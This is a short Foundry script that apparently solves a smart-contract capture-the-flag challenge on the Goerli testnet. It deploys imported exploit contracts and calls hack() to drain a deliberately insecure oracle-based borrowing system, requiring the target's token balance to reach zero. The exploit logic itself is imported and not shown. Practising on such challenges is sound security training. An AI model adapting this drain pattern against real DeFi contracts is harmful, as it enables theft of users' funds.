// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../test/Challenge3.t.sol";
import "../src/Challenge3.borrow_system.sol";

// source .env && forge script script/Challenge3.s.sol:Challenge3Script --rpc-url $GOERLI_RPC_URL --broadcast --private-key $ETH_PRIV_KEY --etherscan-api-key $ETHERSCAN_API_KEY -vvvv
// source .env && forge script script/Challenge3.s.sol:Challenge3Script --fork-url $GOERLI_RPC_URL --private-key $ETH_PRIV_KEY -vvvv
contract Challenge3Script is Script {
    address player;
    IERC20 token0 = IERC20(0x758Ea92c1403E2D77b6Cccac94A98A7c6Fdf3C75);
    IERC20 token1 = IERC20(0x6897a8B00282927b3f984994872846Db9FC4079F);
    BorrowSystemInsecureOracle target = BorrowSystemInsecureOracle(0x2C44547DDEEef6D41c26905c1a36c9750F56f91E);
    InsecureDexLP oracleDex = InsecureDexLP(0x44d99FB0e7C2a19C63eA9dAE667a5Fe6501D4Dba);
    InSecureumLenderPool flashLoanPool = InSecureumLenderPool(0x29c8Db901CB4Bf234217DFAB3D491CC0C448219c);

    function setUp() public {
        player = tx.origin;
    }

    function run() public {
        vm.startBroadcast();
        
        ExploitLenderPool expLP = new ExploitLenderPool();

        Exploit exp = new Exploit(player, token0, token1, target, oracleDex, flashLoanPool, expLP);

        exp.hack();

        require(token0.balanceOf(address(target)) == 0, "You should empty the target contract");

        vm.stopBroadcast();
    }
}